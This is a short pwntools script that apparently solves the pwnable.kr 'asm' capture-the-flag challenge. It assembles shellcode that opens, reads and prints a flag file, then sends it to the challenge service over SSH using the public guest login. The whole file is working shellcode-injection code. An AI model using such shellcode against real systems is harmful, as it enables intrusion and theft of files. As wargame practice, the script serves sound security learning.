from pwn import *

# Ensure compatibility when running on macOS
context(arch='amd64', os='linux')  # Target architecture and OS remain Linux

file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
length = 50

# Generate shellcode using pwntools
shellcode = asm(
    shellcraft.open(file_name) +#type:ignore
    shellcraft.read('rax', 'rsp', length) +#type:ignore
    shellcraft.write(1, 'rsp', length) +#type:ignore
    shellcraft.exit(0)#type:ignore
) 

# SSH into the target Linux machine
sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)  # SSH details
p = sh.remote('0', 9026)  # Connect to the remote challenge service

# Interact with the service
print(p.recv())  # Receive the initial message
p.sendline(shellcode)  # Send the generated shellcode
print(p.recv())  # Receive and print the output (likely the flag)
